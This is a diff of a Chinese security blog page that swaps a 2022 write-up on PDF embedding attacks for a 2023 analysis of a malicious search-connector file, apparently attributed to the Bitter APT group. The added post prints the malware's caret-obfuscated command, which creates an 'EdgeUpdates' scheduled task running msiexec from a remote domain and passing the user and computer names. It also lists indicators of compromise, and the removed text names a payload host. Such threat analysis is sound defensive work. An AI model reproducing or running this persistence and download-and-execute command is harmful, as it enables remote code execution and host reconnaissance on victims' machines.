@@ -16,27 +16,29 @@
   <meta name="author" content="Demo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前两天无意看到某公众号推送的文章 https:&#x2F;&#x2F;www.freebuf.com&#x2F;news&#x2F;333958.html 看起来是外文搬运，PDF文件似曾相识，在某客户单位的监测设备上看到过，再拿出来瞧瞧 外文原文   当时就感觉很有意思，原理很简单，但是静态免杀效果很好，截至今天卡巴和火绒都免杀，虽然运行起来大概率会被杀 其实就是很简单的PDF嵌入，执行JS代码(exportDataObject)">
+    <meta name="description" content="恶意文件基本情况如下：   文件为搜索连接器文件 (.searchConnector-ms)，官方文档： https:&#x2F;&#x2F;learn.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;search&#x2F;search-sconn-desc-schema-entry#what-are-search-connectors 可以看出攻击者针对的是win10以上系统用户  文件会通过Windo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PDF嵌入攻击">
-<meta property="og:url" content="http://wangchenchina.github.io/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:title" content="搜索连接器——疑似蔓灵花恶意文件">
+<meta property="og:url" content="http://wangchenchina.github.io/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/index.html">
 <meta property="og:site_name" content="Demo_博客">
-<meta property="og:description" content="前两天无意看到某公众号推送的文章 https:&#x2F;&#x2F;www.freebuf.com&#x2F;news&#x2F;333958.html 看起来是外文搬运，PDF文件似曾相识，在某客户单位的监测设备上看到过，再拿出来瞧瞧 外文原文   当时就感觉很有意思，原理很简单，但是静态免杀效果很好，截至今天卡巴和火绒都免杀，虽然运行起来大概率会被杀 其实就是很简单的PDF嵌入，执行JS代码(exportDataObject)">
+<meta property="og:description" content="恶意文件基本情况如下：   文件为搜索连接器文件 (.searchConnector-ms)，官方文档： https:&#x2F;&#x2F;learn.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;search&#x2F;search-sconn-desc-schema-entry#what-are-search-connectors 可以看出攻击者针对的是win10以上系统用户  文件会通过Windo">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://wangchenchina.github.io/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142158793.png">
-<meta property="og:image" content="http://wangchenchina.github.io/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142651194.png">
-<meta property="og:image" content="http://wangchenchina.github.io/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142748304.png">
-<meta property="og:image" content="http://wangchenchina.github.io/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525150923518.png">
-<meta property="article:published_time" content="2022-05-25T07:33:04.000Z">
-<meta property="article:modified_time" content="2022-05-25T07:38:51.376Z">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095620302.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095704092.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095732908.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095753681.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906100133512.png">
+<meta property="og:image" content="http://wangchenchina.github.io/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906100224267.png">
+<meta property="article:published_time" content="2023-09-06T02:31:39.000Z">
+<meta property="article:modified_time" content="2023-09-06T02:33:03.603Z">
 <meta property="article:author" content="Demo">
-<meta property="article:tag" content="PDF">
+<meta property="article:tag" content="搜索连接器">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://wangchenchina.github.io/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142158793.png">
+<meta name="twitter:image" content="http://wangchenchina.github.io/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095620302.png">
   
   
   
-  <title>PDF嵌入攻击 - Demo_博客</title>
+  <title>搜索连接器——疑似蔓灵花恶意文件 - Demo_博客</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="PDF嵌入攻击"></span>
+            <span id="subtitle" data-typed-text="搜索连接器——疑似蔓灵花恶意文件"></span>
           
         </div>
 
@@ -224,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-05-25 15:33" pubdate>
-          2022年5月25日 下午
+        <time datetime="2023-09-06 10:31" pubdate>
+          2023年9月6日 上午
         </time>
       </span>
     
@@ -236,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          876 字
+          723 字
         
       </span>
     
@@ -247,7 +249,7 @@
         
         
         
-          8 分钟
+          7 分钟
         
       </span>
     
@@ -285,41 +287,34 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">PDF嵌入攻击</h1>
+            <h1 style="display: none">搜索连接器——疑似蔓灵花恶意文件</h1>
             
             
               <div class="markdown-body">
                 
-                <p>前两天无意看到某公众号推送的文章</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/333958.html">https://www.freebuf.com/news/333958.html</a></p>
-<p>看起来是外文搬运，PDF文件似曾相识，在某客户单位的监测设备上看到过，再拿出来瞧瞧</p>
-<p><a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/pdf-smuggles-microsoft-word-doc-to-drop-snake-keylogger-malware/">外文原文</a></p>
-<img src="image-20220525142158793.png" srcset="/img/loading.gif" lazyload alt="样本信息" style="zoom:67%;" />
+                <p>恶意文件基本情况如下：</p>
+<p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095620302.png" srcset="/img/loading.gif" lazyload alt="image-20230906095620302"></p>
+<p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095704092.png" srcset="/img/loading.gif" lazyload alt="image-20230906095704092"></p>
+<p>文件为搜索连接器文件 (.searchConnector-ms)，官方文档：</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/search/search-sconn-desc-schema-entry#what-are-search-connectors">https://learn.microsoft.com/zh-cn/windows/win32/search/search-sconn-desc-schema-entry#what-are-search-connectors</a></p>
+<p>可以看出攻击者针对的是win10以上系统用户</p>
+<p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095732908.png" srcset="/img/loading.gif" lazyload alt="image-20230906095732908"></p>
+<p>文件会通过Windows资源管理器请求远程地址<a target="_blank" rel="noopener" href="http://atocguserservice.com/res2/2/1/%E8%8E%B7%E5%8F%96%E4%B8%8B%E4%B8%80%E6%AD%A5%E7%9A%84%E7%97%85%E6%AF%92%E6%96%87%E4%BB%B6">http://atocguserservice.com/res2/2/1/获取下一步的病毒文件</a></p>
+<p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906095753681.png" srcset="/img/loading.gif" lazyload alt="image-20230906095753681"></p>
+<p>![屏幕截图 2023-09-06 090319](屏幕截图 2023-09-06 090319.png)</p>
+<p>获取的rar中包含docx文件，但是文件实际为纯文本    <em><strong>THIS IS A README FILE</strong></em>。</p>
+<p>恶意文件功能主要集中在LNK文件，其中包含恶意cmd命令（同蔓灵花CHM文件执行的命令）</p>
+<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">schtasks /create /sc minute /mo </span><span class="hljs-number">15</span><span class="language-xml"> /f /tn EdgeUpdates /tr &quot;%coMSPec% /c s</span><span class="hljs-keyword">^ta</span><span class="hljs-keyword">^rt</span><span class="language-xml"> /</span><span class="hljs-keyword">^m</span><span class="hljs-keyword">^i</span><span class="hljs-keyword">^n</span><span class="language-xml"> m</span><span class="hljs-keyword">^s</span><span class="hljs-keyword">^i</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^xe</span><span class="hljs-keyword">^c</span><span class="language-xml"> ^/</span><span class="hljs-keyword">^i</span><span class="language-xml">  h</span><span class="hljs-keyword">^tt</span><span class="hljs-keyword">^p:</span><span class="language-xml">//</span><span class="hljs-keyword">^w</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^b</span><span class="hljs-keyword">^a</span><span class="hljs-keyword">^n</span><span class="hljs-keyword">^d</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^r</span><span class="hljs-keyword">^s</span><span class="hljs-keyword">^o</span><span class="hljs-keyword">^n</span><span class="hljs-keyword">^d</span><span class="hljs-keyword">^e</span><span class="hljs-keyword">^s</span><span class="hljs-keyword">^i</span><span class="hljs-keyword">^g</span><span class="hljs-keyword">^n.</span><span class="hljs-keyword">^c</span><span class="hljs-keyword">^o</span><span class="hljs-keyword">^m</span><span class="language-xml">/</span><span class="hljs-keyword">^z</span><span class="hljs-keyword">^a</span><span class="hljs-keyword">^r</span><span class="hljs-keyword">^a</span><span class="language-xml">/jkl.p</span><span class="hljs-keyword">^h</span><span class="hljs-keyword">^p</span><span class="language-xml">?p</span><span class="hljs-keyword">^i</span><span class="language-xml">=%username%*%computername% /</span><span class="hljs-keyword">^q</span><span class="hljs-keyword">^n</span><span class="language-xml"> ^/</span><span class="hljs-keyword">^norestart</span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>当时就感觉很有意思，原理很简单，但是静态免杀效果很好，截至今天卡巴和火绒都免杀，虽然运行起来大概率会被杀</p>
-<p>其实就是很简单的PDF嵌入，执行JS代码(exportDataObject)</p>
-<p><img src="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142651194.png" srcset="/img/loading.gif" lazyload alt="JavaScript代码"></p>
-<p>exportDataObject函数包含 2 个参数的对象： </p>
-<ul>
-<li>cName，嵌入对象的名称</li>
-<li>nLaunch，关于 PDF 阅读器应如何处理导出对象的说明</li>
-</ul>
-<p>nLaunch是一个整数，它具有三个有效值： </p>
-<ol>
-<li>提示用户输入路径并将文件保存在那里 </li>
-<li>提示用户输入路径，保存文件，并要求操作系统打开它 </li>
-<li>选择一个临时位置，将文件保存在那里，并要求操作系统打开它</li>
-</ol>
-<p><img src="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525142748304.png" srcset="/img/loading.gif" lazyload alt="嵌入的word文件"></p>
-<p>包含的docx文件包含CVE-2017-0199漏洞，发起请求htt_ps:&#x2F;&#x2F;<a href="mailto:&#103;&#x69;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#111;&#109;&#64;&#50;&#108;&#x2e;&#x6c;&#118;">&#103;&#x69;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#111;&#109;&#64;&#50;&#108;&#x2e;&#x6c;&#118;</a>&#x2F;26，实际跳转到</p>
-<p>htt_p:&#x2F;&#x2F;192.227.196.211&#x2F;dhl_shp&#x2F;doc_000909000.doc，但是已经挂了，应该是HTA文件执行下一步攻击</p>
-<p>真的是一步三折</p>
-<p><img src="/2022/05/25/PDF%E5%B5%8C%E5%85%A5%E6%94%BB%E5%87%BB/image-20220525150923518.png" srcset="/img/loading.gif" lazyload alt="通联地址"></p>
-<p>类似的样本分析<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1041653-1-1.html">https://www.52pojie.cn/thread-1041653-1-1.html</a></p>
-<p>利用的同外文原文一样都有CVE-2017-11882</p>
-<p>找到两个国外PDF嵌入攻击教程，比较老了，多是嵌入PE文件，不像这个样本绕了一圈，可以以后弄得玩</p>
-<p><a target="_blank" rel="noopener" href="https://ironhackers.es/en/tutoriales/pdf-malicioso-en-windows-10-con-settingcontent-ms-embebido/">https://ironhackers.es/en/tutoriales/pdf-malicioso-en-windows-10-con-settingcontent-ms-embebido/</a></p>
-<p><a target="_blank" rel="noopener" href="https://nora.codes/post/pdf-embedding-attacks/">https://nora.codes/post/pdf-embedding-attacks/</a></p>
+<p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906100133512.png" srcset="/img/loading.gif" lazyload alt="image-20230906100133512"></p>
+<p>创建EdgeUpdates计划任务</p>
+<p><img src="/2023/09/06/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8%E2%80%94%E2%80%94%E7%96%91%E4%BC%BC%E8%94%93%E7%81%B5%E8%8A%B1%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/image-20230906100224267.png" srcset="/img/loading.gif" lazyload alt="image-20230906100224267"></p>
+<p>同样单次请求失败</p>
+<p><em>新手法新方式免杀隐蔽性OK</em></p>
+<p><strong>IOCs：</strong></p>
+<p>7A956665925548CC805A4EA090B0341A</p>
+<p>webandersondesign.com</p>
+<p>atocguserservice.com</p>
 
                 
               </div>
@@ -353,7 +348,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/PDF/">#PDF</a>
+        <a href="/tags/%E6%90%9C%E7%B4%A2%E8%BF%9E%E6%8E%A5%E5%99%A8/">#搜索连接器</a>
       
     </div>
   
@@ -365,8 +360,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>PDF嵌入攻击</div>
-      <div>http://wangchenchina.github.io/2022/05/25/PDF嵌入攻击/</div>
+      <div>搜索连接器——疑似蔓灵花恶意文件</div>
+      <div>http://wangchenchina.github.io/2023/09/06/搜索连接器——疑似蔓灵花恶意文件/</div>
     </div>
     <div class="license-meta">
       
@@ -378,7 +373,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年5月25日</div>
+          <div>2023年9月6日</div>
         </div>
       
       
@@ -410,18 +405,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/02/blackice%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/" title="blackice病毒分析">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">blackice病毒分析</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/05/24/%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/" title="使用mimikatz获取账号密码">
-                        <span class="hidden-mobile">使用mimikatz获取账号密码</span>
+                      <a href="/2023/05/04/buuctf-pwn/" title="buuctf-pwn">
+                        <span class="hidden-mobile">buuctf-pwn</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
